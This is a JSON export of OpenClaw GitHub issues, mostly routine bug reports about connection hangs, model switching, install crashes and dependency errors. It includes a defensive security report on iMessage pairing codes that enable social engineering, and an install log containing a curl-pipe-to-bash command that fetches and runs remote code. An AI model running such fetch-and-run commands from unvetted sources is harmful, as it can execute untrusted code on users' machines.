evWithOff.off?.(\"connection.update\", handler);\n        reject(update.lastDisconnect ?? new Error(\"Connection closed\"));\n      }\n    };\n    sock.ev.on(\"connection.update\", handler);\n    // <-- No timeout! Hangs if neither \"open\" nor \"close\" fires\n  });\n}\n```\n\n## Environment\n- Version: latest (main branch)\n- OS: Any\n- Install method: Any\n\n## Impact\n- **Channel unavailability**: WhatsApp channel becomes stuck\n- **Startup hangs**: If called during startup, blocks entire gateway\n- **Resource leak**: Event listener attached but never fires\n- **No visibility**: No error indicates the hang\n\n## Recommended fix\nAdd timeout to connection wait:\n```typescript\nexport async function waitForWaConnection(\n  sock: ReturnType<typeof makeWASocket>,\n  timeoutMs = 60000\n) {\n  return new Promise<void>((resolve, reject) => {\n    const timeout = setTimeout(() => {\n      evWithOff.off?.(\"connection.update\", handler);\n      reject(new Error('WhatsApp connection timeout'));\n    }, timeoutMs);\n\n    const handler = (...args: unknown[]) => {\n      const update = (args[0] ?? {}) as Partial<ConnectionState>;\n      if (update.connection === \"open\") {\n        clearTimeout(timeout);\n        evWithOff.off?.(\"connection.update\", handler);\n        resolve();\n      }\n      if (update.connection === \"close\") {\n        clearTimeout(timeout);\n        evWithOff.off?.(\"connection.update\", handler);\n        reject(update.lastDisconnect ?? new Error(\"Connection closed\"));\n      }\n    };\n    sock.ev.on(\"connection.update\", handler);\n  });\n}\n```",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4956",
      "createdAt": "2026-01-30T21:51:10Z",
      "updatedAt": "2026-02-11T04:12:59Z",
      "author": "coygeek",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "whatsapp"
        ],
        "platforms": [],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3830629674,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4956#issuecomment-3830629674",
          "createdAt": "2026-02-01T08:43:18Z",
          "updatedAt": "2026-02-01T08:43:18Z",
          "author": "coygeek",
          "body": "## CVSS Assessment\n\n| Metric | Value |\n|--------|-------|\n| **Score** | 5.1 / 10.0 |\n| **Severity** | Medium |\n| **Vector** | CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H |\n\n> [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H)\n"
        },
        {
          "id": 3882021303,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4956#issuecomment-3882021303",
          "createdAt": "2026-02-11T04:12:59Z",
          "updatedAt": "2026-02-11T04:12:59Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4959,
      "title": "Model picker (/model) not applied; status header stuck on claude-haiku-4-5",
      "body": "## Summary\nModel switching via the UI model picker (and `/model ...` command) appears ineffective and/or the UI status header shows a stale/incorrect model. We repeatedly selected **Opus 4.5** (and later **GPT-5.2**) but the session status line continued to show **claude-haiku-4-5** and the display looked inconsistent/broken.\n\n## What we’re seeing\n- UI status header shows something like:\n  - `connected | idle agent main | session main (whatsapp:g-agent-main-main) | anthropic/claude-haiku-4-5 | tokens 56k/200k (28%)`\n- Switching the model in the UI (e.g. selecting `anthropic/claude-opus-4-5`) does not reliably change what the UI reports, and may not change the model actually responding.\n- There’s also a general “display is broken” symptom when attempting model changes (status/header not updating, inconsistent model/context reporting).\n\n## Steps to reproduce\n1. Start/continue a session (agent `main`).\n2. Use the UI model picker to select `anthropic/claude-opus-4-5` (Opus 4.5).\n   - Alternatively run `/model opus`.\n3. Observe that the status header continues to show `anthropic/claude-haiku-4-5` (and a 200k context window), and the UI does not reflect the selected model.\n4. Repeat with another model (e.g. `openai-codex/gpt-5.2`).\n\n## Expected\n- The selected model is applied to subsequent assistant responses.\n- The UI status/header updates to reflect the *actual* model in use.\n- CLI status (`… status`) and UI status agree on the session model and context window.\n\n## Actual\n- Status/header remains stuck on `anthropic/claude-haiku-4-5`.\n- Model picker and/or `/model` command does not appear to take effect reliably.\n- Model/context information appears inconsistent across status surfaces.\n\n## Environment\n- Version: `2026.1.24-3`\n- OS: Linux (Ubuntu), Node v22.x\n- Session key: `agent:main:main`\n\n## Notes / Hypothesis\nIt looks like the status header may be reading from cached metadata or an agent default (possibly the heartbeat model) rather than the per-session override / live runtime model. Fixing this likely requires:\n- Ensuring model selection updates the session runtime and persisted metadata\n- Ensuring the status header reads from the same source of truth as the actual responder\n\nHappy to provide more logs if you tell us which debug command/output is most useful.\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4959",
      "createdAt": "2026-01-30T21:56:27Z",
      "updatedAt": "2026-02-11T04:12:57Z",
      "author": "Pip-Tout",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "whatsapp"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3882021246,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4959#issuecomment-3882021246",
          "createdAt": "2026-02-11T04:12:57Z",
          "updatedAt": "2026-02-11T04:12:57Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4965,
      "title": "[Bug]: Sonnet 4.5 shows a context window of 2m tokens",
      "body": "## Summary\n/status reports a context window of 2M for Sonnet 4.5 \n\n[Claude documentation indicates 1M as the max](https://platform.claude.com/docs/en/build-with-claude/context-windows) and requires API with beta headers (I'm using a Max subscription). \n\n## Steps to reproduce\n1. Switch to anthropic/claude-sonnet-4-5\n2. Run /status \n\n## Expected behavior\nAccurate context window stats\n\n## Actual behavior\n\n/status returns\n\nOpenClaw 2026.1.29 (a5b4d22) \n🧠 Model: anthropic/claude-sonnet-4-5 · 🔑 unknown \n🧮 Tokens: 212 in / 589 out \n📚 Context: 34k/2.0m (2%) · \n🧹 Compactions: 0 \n🧵 Session: agent:main:main • updated just now \n⚙️ Runtime: direct · Think: high \n🪢 Queue: collect (depth 0)\n\n\n## Environment\n- Clawdbot version: OpenClaw 2026.1.29 (a5b4d22) \n- OS: Linux (Debian 12)\n- Install method (pnpm/npx/docker/etc): npm\n\n\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4965",
      "createdAt": "2026-01-30T22:09:04Z",
      "updatedAt": "2026-02-11T04:12:56Z",
      "author": "dial481",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "windows",
          "linux",
          "docker"
        ],
        "components": [
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3882021183,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4965#issuecomment-3882021183",
          "createdAt": "2026-02-11T04:12:55Z",
          "updatedAt": "2026-02-11T04:12:55Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4995,
      "title": "Security: iMessage dmPolicy 'pairing' auto-responds to unknown contacts with pairing codes",
      "body": "## Summary\n\nThe iMessage channel's `dmPolicy: \"pairing\"` mode automatically sends pairing codes to **any unknown contact** who messages the OpenClaw instance, creating an information disclosure vulnerability and social engineering attack vector.\n\n## Steps to Reproduce\n\n1. Configure OpenClaw with iMessage enabled:\n```json\n\"channels\": {\n  \"imessage\": {\n    \"enabled\": true,\n    \"dmPolicy\": \"pairing\",\n    \"groupPolicy\": \"allowlist\"\n  }\n}\n```\n\n2. Have an unknown/unapproved contact send an iMessage to your phone number\n3. OpenClaw automatically responds with a pairing code (e.g., an 8-character alphanumeric code)\n4. The stranger now knows you're running an AI assistant with pairing capability\n\n## Security Impact\n\n### 1. Information Disclosure\n- Any stranger with your phone number learns you're running an AI assistant\n- They learn it's accessible via a pairing mechanism\n- Exposes you as a target for social engineering attacks\n\n### 2. Social Engineering Vector\nAttackers can:\n- Impersonate tech support (\"We need that code to fix your account\")\n- Use urgency tactics to trick users into approving codes\n- Pretend to be legitimate contacts\n\n### 3. No Rate Limiting\n- Anyone can repeatedly trigger pairing code generation\n- No apparent rate limiting on auto-responses\n- Potential for spam/harassment\n\n### 4. Violates Principle of Least Privilege\n- Auto-responses to **completely unknown contacts** violates secure-by-default principles\n- Users may not understand the security implications of approving codes\n\n## Real-World Evidence\n\nThis issue aligns with industry security concerns raised by:\n- [Cisco Security Blog](https://blogs.cisco.com/ai/personal-ai-agents-like-openclaw-are-a-security-nightmare) - \"Personal AI Agents like OpenClaw Are a Security Nightmare\"\n- [Dark Reading](https://www.darkreading.com/application-security/openclaw-ai-runs-wild-business-environments) - \"OpenClaw AI Runs Wild in Business Environments\"\n\n## Suggested Mitigations\n\n### Option 1: Reverse the Flow (Recommended)\n- Don't auto-respond to unknown contacts\n- Require users to initiate pairing from the OpenClaw CLI/UI\n- Generate codes only when explicitly requested: `openclaw pairing generate imessage`\n\n### Option 2: Pre-approved Contacts Only\n- Change default `dmPolicy` from `\"pairing\"` to `\"allowlist\"`\n- Only send pairing codes to contacts you've pre-approved\n- Require manual allowlist addition before auto-responses\n\n### Option 3: Explicit Opt-in Warning\n- During setup wizard, clearly warn users about auto-response behavior\n- Show example: \"Any stranger who messages you will receive a pairing code\"\n- Require explicit confirmation with security implications spelled out\n\n### Option 4: Rate Limiting\n- Limit pairing code generation to 1 per contact per 24 hours\n- Add exponential backoff for repeated attempts\n- Log suspicious activity\n\n## Expected Behavior\n\nUnknown contacts should **not** receive any auto-response unless:\n1. User has explicitly pre-approved that contact, OR\n2. User has explicitly enabled \"respond to all\" mode with clear security warnings\n\n## Current Workaround\n\nUsers can protect themselves by:\n1. Setting `\"dmPolicy\": \"allowlist\"` instead of `\"pairing\"`\n2. Disabling iMessage channel entirely: `\"enabled\": false`\n3. Pre-approving only known contacts\n\n## Environment\n\n- OpenClaw version: 2026.1.29\n- Platform: macOS\n- Channel: iMessage\n\n---\n\n**Severity:** Medium to High (information disclosure + social engineering vector)\n**Suggested Labels:** security, enhancement, imessage, channels",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4995",
      "createdAt": "2026-01-30T22:54:13Z",
      "updatedAt": "2026-02-11T04:12:55Z",
      "author": "cooneycw",
      "labels": [
        "bug",
        "security",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "imessage"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "onboarding",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3882020954,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4995#issuecomment-3882020954",
          "createdAt": "2026-02-11T04:12:49Z",
          "updatedAt": "2026-02-11T04:12:49Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4978,
      "title": "Clawdbot headless browser fails to start when Chromium is snap/stub (CDP launch)",
      "body": "Environment\n- Clawdbot: 2026.1.24-3\n- OS: Ubuntu 24.04 (server)\n\nProblem\n- Built-in browser control server is reachable, but starting the dedicated headless browser profile repeatedly fails with:\n  \"Failed to start Chrome CDP on port <port>\".\n\nNotes / suspected cause\n- On some Ubuntu server installs, `/usr/bin/chromium-browser` is a stub that requires the `chromium` snap.\n- Manually launching headless Chromium via snap works (`snap run chromium --headless ... --remote-debugging-port=9223`), but Clawdbot appears to be launching the stub path (or otherwise not using the snap runner), and there doesn't appear to be a supported config key to override the executable/launch command.\n\nExpected\n- Clawdbot should detect the snap Chromium situation and launch Chromium in a way that successfully exposes the CDP endpoint.\n- Alternatively, support an explicit executable/launch override for the clawd browser profile.\n\nWorkaround\n- Use Chrome extension relay / attached tab instead of headless browser.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4978",
      "createdAt": "2026-01-30T22:30:31Z",
      "updatedAt": "2026-02-11T04:12:54Z",
      "author": "DeadlySilent",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882021136,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4978#issuecomment-3882021136",
          "createdAt": "2026-02-11T04:12:53Z",
          "updatedAt": "2026-02-11T04:12:53Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4979,
      "title": "ClawdHub CLI: auth fails when registry base redirects (Authorization header dropped)",
      "body": "Problem\n- Using the ClawdHub CLI, token verification / publish can fail with Unauthorized when the configured registry base URL redirects.\n\nObserved\n- When the registry is set to `https://clawhub.ai` (no www), it redirects to `https://www.clawhub.ai`.\n- On redirect, the HTTP client appears to drop the `Authorization` header, so the final request hits the destination without the token -> Unauthorized.\n\nFix / workaround\n- Configure the registry base to the final URL directly (e.g. `https://www.clawhub.ai`) to avoid redirects.\n\nExpected\n- Follow redirects while preserving Authorization header (or re-apply auth on redirect), or disallow redirecting registry bases with a clear error.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4979",
      "createdAt": "2026-01-30T22:30:32Z",
      "updatedAt": "2026-02-11T04:12:52Z",
      "author": "DeadlySilent",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "web-ui",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882021071,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4979#issuecomment-3882021071",
          "createdAt": "2026-02-11T04:12:52Z",
          "updatedAt": "2026-02-11T04:12:52Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 4980,
      "title": "Interactive CLI flows can be SIGKILL'd in agent exec (e.g., gh auth login waiting for approval)",
      "body": "Problem\n- Long-running interactive CLI flows can be terminated (SIGKILL) before the user completes the out-of-band step.\n\nExample\n- `gh auth login --web` prints the one-time code + URL, then waits for the user to approve.\n- In some agent exec environments, the process gets SIGKILL before approval, so the auth never completes.\n\nWorkaround\n- Run the command in a backgrounded session (or similar keep-alive), so the process can wait long enough for the user to complete approval.\n\nExpected\n- Tooling should avoid killing interactive flows prematurely, or provide a first-class pattern for “await external approval” flows.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4980",
      "createdAt": "2026-01-30T22:30:33Z",
      "updatedAt": "2026-02-11T04:12:51Z",
      "author": "DeadlySilent",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3882021016,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4980#issuecomment-3882021016",
          "createdAt": "2026-02-11T04:12:50Z",
          "updatedAt": "2026-02-11T04:12:50Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5001,
      "title": "[Bug]: Gemini 3 thoughtSignature field causes \"Thought signature is not   valid\" error in multi-turn conversations",
      "body": "When using google/gemini-3-flash-preview model via OpenRouter, multi-turn conversations fail with a 400 error after the first tool call. The error occurs because Gemini 3 models now include a thoughtSignature field in tool call responses, and OpenClaw includes this field when sending conversation history back to the API, causing Google to reject the request with signature validation failure.\n\n  Environment\n\n  - OpenClaw version: 2026.1.29\n  - Provider: OpenRouter\n  - Model: google/gemini-3-flash-preview\n\n  Steps to Reproduce\n\n  1. Configure OpenClaw to use openrouter/google/gemini-3-flash-preview as default model\n  2. Start a conversation that triggers a tool call\n  3. After the tool result returns, the next API request fails\n\n  Error Message\n\n  {\n    \"error\": {\n      \"code\": 400,\n      \"message\": \"Unable to submit request because Thought signature is not valid.. Learn more: https://cloud.google.com/vertex-ai/generative-ai/docs/model-reference/gemini\",\n      \"status\": \"INVALID_ARGUMENT\"\n    }\n  }\n\n  Root Cause\n\n  From session history (.jsonl), the assistant message contains:\n\n  {\n    \"type\": \"toolCall\",\n    \"id\": \"tool_exec_BUUMvPBjGgWMyeFgTA7H\",\n    \"name\": \"exec\",\n    \"arguments\": {...},\n    \"thoughtSignature\":\n  \"{\\\"index\\\":0,\\\"id\\\":\\\"tool_exec_...\\\",\\\"type\\\":\\\"reasoning.encrypted\\\n  \",\\\"data\\\":\\\"...\\\",\\\"format\\\":\\\"google-gemini-v1\\\"}\"\n  }\n\nWhen OpenClaw sends the next request, this thoughtSignature field is included in the conversation history. Google's API then attempts to validate the signature, which fails.\n\nExpected Behavior\n\nOpenClaw should strip thoughtSignature (and potentially other provider-specific metadata fields) from message history before sending requests to the API.\n\nSuggested Fix\n\nWhen building the messages array for API requests, filter out the thoughtSignature field from tool call content blocks:\n\n  // Pseudo-code\n  messages = messages.map(msg => ({\n    ...msg,\n    content: msg.content.map(block => {\n      if (block.type === 'toolCall') {\n        const { thoughtSignature, ...rest } = block;\n        return rest;\n      }\n      return block;\n    })\n  }));\n\nWorkaround\n\nStart a new conversation (/new) after encountering the error, or use a non-Gemini model.\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5001",
      "createdAt": "2026-01-30T23:05:23Z",
      "updatedAt": "2026-02-11T04:12:47Z",
      "author": "vergilsilverhand",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882020881,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5001#issuecomment-3882020881",
          "createdAt": "2026-02-11T04:12:47Z",
          "updatedAt": "2026-02-11T04:12:47Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5008,
      "title": "[Bug]: install.sh crash on Ubuntu",
      "body": "## Summary\nWhat went wrong?\n\nThe installation: `curl -fsSL https://openclaw.ai/install.sh | bash`, crashed with some error log.\n\n## Environment\n- Clawdbot version: `$ openclaw --version`: `2026.1.29`\n- OS: Ubuntu 24.04.3 LTS\n- Install method : `curl install.sh | bash` (I think it's npm)\n\n## Logs or screenshots\nPaste relevant logs or add screenshots (redact secrets).\n\n```\nubuntu@ubu-vnic-2025-12-28:~$ curl -fsSL https://openclaw.ai/install.sh | bash\n\n  🦞 OpenClaw Installer\n  Automation with claws: minimal fuss, maximal pinch.\n\n✓ Detected: linux\n✓ Node.js v22.22.0 found\n✓ Git already installed\n→ Installing OpenClaw 2026.1.29...\n✓ OpenClaw installed\n\n🦞 OpenClaw installed successfully (2026.1.29)!\ncracks claws Alright, what are we building?\n\nStarting setup...\n\n\n\n<--- Last few GCs --->\n\n[1807:0x6bb5000]   145867 ms: Mark-Compact 475.3 (489.7) -> 474.4 (490.4) MB, pooled: 2 MB, 3388.38 / 0.00 ms  (average mu = 0.258, current mu = 0.051) allocation failure; scavenge might not succeed\n[1807:0x6bb5000]   149612 ms: Mark-Compact 476.5 (490.4) -> 475.6 (495.7) MB, pooled: 0 MB, 3731.20 / 0.00 ms  (average mu = 0.146, current mu = 0.004) allocation failure; scavenge might not succeed\n\n\n<--- JS stacktrace --->\n\nFATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory\n----- Native stack trace -----\n\n 1: 0xe40d24 node::OOMErrorHandler(char const*, v8::OOMDetails const&) [openclaw]\n 2: 0x1216be0 v8::Utils::ReportOOMFailure(v8::internal::Isolate*, char const*, v8::OOMDetails const&) [openclaw]\n 3: 0x1216eb7 v8::internal::V8::FatalProcessOutOfMemory(v8::internal::Isolate*, char const*, v8::OOMDetails const&) [openclaw]\n 4: 0x1444875  [openclaw]\n 5: 0x145e109 v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) [openclaw]\n 6: 0x14327b8 v8::internal::HeapAllocator::AllocateRawWithLightRetrySlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment) [openclaw]\n 7: 0x14336e5 v8::internal::HeapAllocator::AllocateRawWithRetryOrFailSlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment) [openclaw]\n 8: 0x140c3be v8::internal::Factory::NewFillerObject(int, v8::internal::AllocationAlignment, v8::internal::AllocationType, v8::internal::AllocationOrigin) [openclaw]\n 9: 0x186da1c v8::internal::Runtime_AllocateInYoungGeneration(int, unsigned long*, v8::internal::Isolate*) [openclaw]       \n10: 0x1dcb476  [openclaw]\nubuntu@ubu-vnic-2025-12-28:~$\nubuntu@ubu-vnic-2025-12-28:~$ free -h\n               total        used        free      shared  buff/cache   available\nMem:           956Mi       327Mi       453Mi       3.9Mi       341Mi       629Mi\nSwap:          4.0Gi       354Mi       3.7Gi\n```",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5008",
      "createdAt": "2026-01-30T23:12:05Z",
      "updatedAt": "2026-02-11T04:12:46Z",
      "author": "mathieucaroff",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3826368063,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5008#issuecomment-3826368063",
          "createdAt": "2026-01-30T23:18:20Z",
          "updatedAt": "2026-01-30T23:18:20Z",
          "author": "mathieucaroff",
          "body": "`$ openclaw models status` also produces a crash:\n\n```\nubuntu@ubu-vnic-2025-12-28:~$ openclaw models status                                                          23:15:48 [0/0]\n\n<--- Last few GCs --->\n\n[2173:0x115f7000]    77121 ms: Scavenge 474.4 (487.2) -> 473.8 (488.0) MB, pooled: 0 MB, 4.36 / 0.00 ms  (average mu = 0.318, current mu = 0.158) allocation failure;                                                                                   [2173:0x115f7000]    77130 ms: Scavenge 475.0 (488.0) -> 474.6 (493.0) MB, pooled: 0 MB, 4.74 / 0.00 ms  (average mu = 0.318, current mu = 0.158) allocation failure;\n                                                                                                                                                                                                                                                        <--- JS stacktrace --->                                                                                                     \n\nFATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory\n----- Native stack trace -----                                                                                              \n\n 1: 0xe40d24 node::OOMErrorHandler(char const*, v8::OOMDetails const&) [openclaw]                                            2: 0x1216be0 v8::Utils::ReportOOMFailure(v8::internal::Isolate*, char const*, v8::OOMDetails const&) [openclaw]\n 3: 0x1216eb7 v8::internal::V8::FatalProcessOutOfMemory(v8::internal::Isolate*, char const*, v8::OOMDetails const&) [openclaw]                                                                                                                           4: 0x1444875  [openclaw]                                                                                                    5: 0x145e109 v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) [openclaw]                                                                                                   6: 0x14327b8 v8::internal::HeapAllocator::AllocateRawWithLightRetrySlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment) [openclaw]\n 7: 0x14336e5 v8::internal::HeapAllocator::AllocateRawWithRetryOrFailSlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment) [openclaw]\n 8: 0x140c3be v8::internal::Factory::NewFillerObject(int, v8::internal::AllocationAlignment, v8::internal::AllocationType, v8::internal::AllocationOrigin) [openclaw]\n 9: 0x186da1c v8::internal::Runtime_AllocateInYoungGeneration(int, unsigned long*, v8::internal::Isolate*) [openclaw]       \n10: 0x1dcb476  [openclaw]\nubuntu@ubu-vnic-2025-12-28:~$\n```"
        },
        {
          "id": 3833458863,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5008#issuecomment-3833458863",
          "createdAt": "2026-02-02T07:35:59Z",
          "updatedAt": "2026-02-02T07:36:30Z",
          "author": "spookyuser",
          "body": "Same!  seem to have only happened to me on devices with less than or = to 1gb of ram \nraspberry pi 3 - this happens\ndigital ocean $5 tier - this happens\nif I upgrade digital ocean to 2gb of ram it stops happening"
        },
        {
          "id": 3882020816,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5008#issuecomment-3882020816",
          "createdAt": "2026-02-11T04:12:45Z",
          "updatedAt": "2026-02-11T04:12:45Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5010,
      "title": "[Bug]: Broken Install Dependency (libsignal)",
      "body": "## Summary\nInstall failed due to broken / missing libsignal dependency\n\n## Steps to reproduce\n1.  Followed one-line install from OpenClaw, npm failed\n2. Attempted npm install -g openclaw@latest --> same issue\n3. Attempted npm install -g openclaw@2026.1.28 --> same result\n4.  Debuged and Claude (not Clawd), identified the libsignal dependency \n\n\n## Expected behavior\nSuccessful install\n\n## Actual behavior\nInstall failed\n\n## Environment\n- Clawdbot version: 2026.01.28 and 01.29\n- OS: macOS with Node.js v22.17.1 and npm 10.9.2\n- Install method (pnpm/npx/docker/etc): per above\n\n## Logs or screenshots\nThe exact error: No matching version found for libsignal@whiskeysockets-libsignal-node-master.tar.gz-art-external\nYour system: macOS with Node.js v22.17.1 and npm 10.9.2\nThat it fails on both version 2026.1.29 and 2026.1.28\n\nThe libsignal connection:\nOpenClaw uses Baileys (from WhiskeySockets) for its WhatsApp integration. Baileys is a WhatsApp Web protocol implementation that depends on libsignal-node for encryption. Your error message shows that the npm package is looking for:\nlibsignal@whiskeysockets-libsignal-node-master.tar.gz-art-external\nThis appears to be a malformed or broken dependency reference. The weird master.tar.gz-art-external part suggests someone may have incorrectly specified a GitHub tarball URL as a version string in the package.json.\nWhat's likely happening:\nThis is almost certainly a packaging error in the latest OpenClaw releases (2026.1.29 and 2026.1.28). The dependency tree for WhatsApp support (via Baileys) isn't resolving correctly.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5010",
      "createdAt": "2026-01-30T23:14:49Z",
      "updatedAt": "2026-02-11T04:12:44Z",
      "author": "ejwbauer",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "whatsapp"
        ],
        "platforms": [
          "macos",
          "docker"
        ],
        "components": [
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3882020742,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5010#issuecomment-3882020742",
          "createdAt": "2026-02-11T04:12:43Z",
          "updatedAt": "2026-02-11T04:12:43Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5017,
      "title": "transcribeInboundAudio() never called for local command path",
      "body": "@mw777eds found this while debugging #1989 — the function `transcribeInboundAudio()` exists in dist/auto-reply/transcription.js but nothing in the Telegram handlers actually calls it.\n\nThe MIME fix in #3904 stops the binary dump, but this is a separate problem: audio messages just... don't get transcribed when using `cfg.audio.transcription.command`.\n\nSteps from their comment:\n1. Set up local transcription via config\n2. Send audio-only message → no transcription  \n3. Send audio + text → transcription runs\n\nLooks like the wiring was never finished for the local command path.\n\nRef: https://github.com/openclaw/openclaw/issues/1989#issuecomment-3825177446",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5017",
      "createdAt": "2026-01-30T23:21:34Z",
      "updatedAt": "2026-02-11T04:12:42Z",
      "author": "hclsys",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3827551969,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5017#issuecomment-3827551969",
          "createdAt": "2026-01-31T05:28:26Z",
          "updatedAt": "2026-01-31T05:30:32Z",
          "author": "hclsys",
          "body": "I took a look at this issue and found something interesting.\n\nFirst off, your observation is totally valid - audio-only messages aren't triggering transcription while audio+text works fine. That's a real bug.\n\nHowever, the root cause seems to be different from what you initially suspected. I couldn't find any `transcribeInboundAudio()` function in the codebase (grep returns 0 results). The transcription is actually wired through `applyMediaUnderstanding()` → `runCapability()` in the media-understanding module.\n\nThe actual problem is in the legacy config migration. There's a hardcoded allowlist in `src/config/legacy.shared.ts`:\n\n```typescript\nconst AUDIO_TRANSCRIPTION_CLI_ALLOWLIST = new Set([\"whisper\"]);\n```\n\nWhen using `whisperx-transcribe.sh` as your transcription command, the migration silently rejects it because `whisperx-transcribe.sh` doesn't match `\"whisper\"`. The config gets deleted with a log message \"Removed audio.transcription (unsupported transcription CLI)\" - easy to miss if you're not watching for it.\n\nI'm working on a PR to expand the allowlist to include whisperx variants. Should have it ready soon."
        },
        {
          "id": 3882020693,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5017#issuecomment-3882020693",
          "createdAt": "2026-02-11T04:12:42Z",
          "updatedAt": "2026-02-11T04:12:42Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5028,
      "title": "WhatsApp linked device outbound messages stuck on 'waiting for this message'",
